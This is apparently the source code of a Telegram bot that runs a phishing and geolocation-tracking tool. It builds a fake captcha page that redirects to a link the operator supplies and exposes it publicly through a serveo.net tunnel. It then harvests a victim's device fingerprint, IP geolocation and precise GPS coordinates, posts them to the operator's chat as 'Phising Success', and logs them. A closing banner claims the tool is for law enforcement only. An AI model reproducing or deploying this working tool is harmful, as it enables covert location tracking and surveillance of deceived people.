import telebot
import subprocess
import os
import sys
import argparse
import requests
import traceback
from time import sleep
from os import path, kill, mkdir
from json import loads, decoder
from packaging import version
from ipaddress import ip_address
from urllib.parse import urlparse

# ----------------------------------------------------------------------------------------------------------------------
# ACCESS TOKEN
TOKEN = subprocess.check_output(
    "cat ./access/token.txt",
    shell=True,
    encoding="utf-8",
).strip()
API = f"{TOKEN}"
BOT = telebot.TeleBot(API)

# ----------------------------------------------------------------------------------------------------------------------

def captcha(ctx):
    link = ctx.text
    domain = urlparse(link).netloc
    www, sitename, tld = domain.split('.')
    import datetime

    date = datetime.datetime.now().strftime("%d-%b-%Y %H:%M:%S")
    # BOT.send_message(ctx.chat.id, f"Your link is: {link}")
    check_runner = subprocess.check_output('bash ./extension/checkrunner.sh', shell=True, encoding='utf-8')
    if "PHP script is running" in check_runner:
        BOT.send_message(ctx.chat.id, f"Anda masih memiliki session yang berjalan, gunakan /restart untuk memulai ulang session anda")
        return
        # os.system('bash ./extension/stoprunner.sh')
    with open('template/captcha/js/location_temp.js', 'r') as location_temp:
        js_file = location_temp.read()
        updated_js_raw = js_file.replace('REDIRECT_URL', link)

    with open('template/captcha/js/location.js', 'w') as updated_js:
        updated_js.write(updated_js_raw)

    with open('template/captcha/index_temp.html', 'r') as temp_index:
        temp_index_data = temp_index.read()
        upd_temp_index_raw = temp_index_data.replace('FAKE_REDIRECT_URL', link)

    with open('template/captcha/index.html', 'w') as updated_index:
        updated_index.write(upd_temp_index_raw)
    location_temp.close()
    updated_js.close()
    temp_index.close()
    updated_index.close()
    with open(os.devnull, 'w') as devnull:
        subprocess.Popen(['bash', './extension/startssh.sh', f'{sitename}'], stdout=devnull, stderr=devnull)
    with open(os.devnull, 'w') as devnull:
        subprocess.Popen(['php', '-S', 'localhost:8080', '-t', 'template/captcha/'] , stdout=devnull, stderr=devnull)
    phislink = f"https://{sitename}.serveo.net"
    BOT.send_message(ctx.chat.id, f"Your link is: {phislink}")

    RESULT = './logs/result.txt'
    INFO = './logs/info.txt'
    printed = False
    while True:
        sleep(2)
        size = os.path.getsize(RESULT)
        if size == 0 and printed is False:
            BOT.send_message(ctx.chat.id, f"Waiting for Client...")
            printed = True
        if size > 0:
            with open(INFO, 'r') as info_file:
                info_file = info_file.read()
            try:
                info_json = loads(info_file)
            except decoder.JSONDecodeError:
                BOT.send_message(ctx.chat.id, f"[-] Exception : {decoder.JSONDecodeError}")
            else:
                var_os = info_json['os']
                var_platform = info_json['platform']
                var_cores = info_json['cores']
                var_ram = info_json['ram']
                var_vendor = info_json['vendor']
                var_render = info_json['render']
                var_res = info_json['wd'] + 'x' + info_json['ht']
                var_browser = info_json['browser']
                var_ip = info_json['ip']
                data_info = f"""<b>[+] OS :</b> {var_os}
<b>[+] Platform :</b> {var_platform}
<b>[+] CPU Cores :</b> {var_cores}
<b>[+] RAM :</b> {var_ram}
<b>[+] Vendor :</b> {var_vendor}
<b>[+] GPU :</b> {var_render}
<b>[+] Resolution :</b> {var_res}
<b>[+] Browser :</b> {var_browser}
<b>[+] IP :</b> {var_ip}"""
                log_info = f"""[+] OS : {var_os}
[+] Platform : {var_platform}
[+] CPU Cores : {var_cores}
[+] RAM : {var_ram}
[+] Vendor : {var_vendor}
[+] GPU : {var_render}
[+] Resolution : {var_res}
[+] Browser : {var_browser}
[+] IP : {var_ip}"""
                if ip_address(var_ip).is_private:
                    BOT.send_message(ctx.chat.id,f'[!] Skipping IP recon because IP address is private')
                else:
                    rqst = requests.get(f'https://ipwhois.app/json/{var_ip}')
                    s_code = rqst.status_code

                    if s_code == 200:
                        data = rqst.text
                        data = loads(data)
                        var_continent = str(data['continent'])
                        var_country = str(data['country'])
                        var_region = str(data['region'])
                        var_city = str(data['city'])
                        var_org = str(data['org'])
                        var_isp = str(data['isp'])
                        data_ip = f"""<b>[+] Continent :</b> {var_continent}
<b>[+] Country :</b> {var_country}
<b>[+] Region :</b> {var_region}
<b>[+] City :</b> {var_city}
<b>[+] Org :</b> {var_org}
<b>[+] ISP :</b> {var_isp}"""
                        log_ip = f"""[+] Continent : {var_continent}
[+] Country : {var_country}
[+] Region : {var_region}
[+] City : {var_city}
[+] Org : {var_org}
[+] ISP : {var_isp}"""
            with open(RESULT, 'r') as result_file:
                results = result_file.read()
            try:
                result_json = loads(results)
            except decoder.JSONDecodeError:
                BOT.send_message(ctx.chat.id,f'[-] Exception : {traceback.format_exc()}')
            else:
                status = result_json['status']
                if status == 'success':
                    var_lat = result_json['lat']
                    var_lon = result_json['lon']
                    var_acc = result_json['acc']
                    var_alt = result_json['alt']
                    var_dir = result_json['dir']
                    var_spd = result_json['spd']
                    data_loc = f"""<b>[+] Latitude :</b> <code>{var_lat}</code>
<b>[+] Longitude :</b> <code>{var_lon}</code>
<b>[+] Accuracy :</b> <code>{var_acc}</code>
<b>[+] Altitude :</b> <code>{var_alt}</code>
<b>[+] Direction :</b> <code>{var_dir}</code>
<b>[+] Speed :</b> <code>{var_spd}</code>
<b>[+] Map :</b> https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}"""
                    log_loc = f"""[+] Latitude : {var_lat}
[+] Longitude : {var_lon}
[+] Accuracy : {var_acc}
[+] Altitude : {var_alt}
[+] Direction : {var_dir}
[+] Speed : {var_spd}
[+] Map : https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}"""
                else:
                    var_err = result_json['error']
                    data_loc = f"""[+] Error     : {var_err}"""
                    log_loc = f"""[+] Error     : {var_err}"""
        
            BOT.send_message(ctx.chat.id, f"""<b>[ Phising Success ]</b>

<b>Tanggal :</b> {date}
<b>Dari link :</b> {phislink}

<b>[!] Device Information :</b>

{data_info}

<b>[!] IP Information :</b>

{data_ip}

<b>[!] Location Information :</b>

{data_loc}

<b>DIGUNAKAN OLEH APARAT DENGAN KEWENANGAN KHUSUS, TIDAK UNTUK KEPENTINGAN PRIBADI DAN HANYA UNTUK UPAYA PENEGAKAN HUKUM !!</b>""" , parse_mode='HTML')
            for_logs = f"""===[{date}]===

[!] Device Information :

{log_info}

[!] IP Information :

{log_ip}

[!] Location Information :

{log_loc} 

==============

"""
            logs = open('./db/result_logs.txt','a')
            logs.write(for_logs)
            logs.close()
            with open(RESULT, 'w+'):
                pass
            with open(INFO, 'w+'):
                pass
